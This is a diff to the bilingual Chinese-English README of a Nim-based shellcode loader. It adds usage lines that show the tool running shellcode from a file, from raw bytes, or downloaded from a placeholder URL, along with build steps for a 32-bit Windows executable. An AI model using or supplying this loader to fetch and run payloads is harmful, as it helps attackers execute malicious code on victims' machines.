@@ -5,6 +5,14 @@ nim编写的shell_loader
 详见以下:
 details:
 # usage
+```
+loader.exe payload.bin
+loader.exe  (yourshellcode)
+loader.exe (http://xxxx/xxx)
+```
+put your url/bin/shellcode direct
+后面直接跟shellcode内容 或者bin文件名 或者网址就行
+
 
 ①use shellcode:
 
@@ -38,3 +46,18 @@ Notice:You must remove '\x' on your shellcode
 
 
 ![](https://github.com/sh3d0ww01f/nim_shellloader/blob/master/image/6.png)
+
+# 编译 compile
+
+step1:   setup  require   安装所需的库
+```
+nimble install https://gitee.com/oagi/winim.git
+nimble install https://gitee.com/oagi/nim-stew
+```
+step2: generate exe   生成exe
+```
+nim c --cpu:i386 -d:mingw -d:ssl --opt:size shellcode_loader.nim
+```
+
+
+
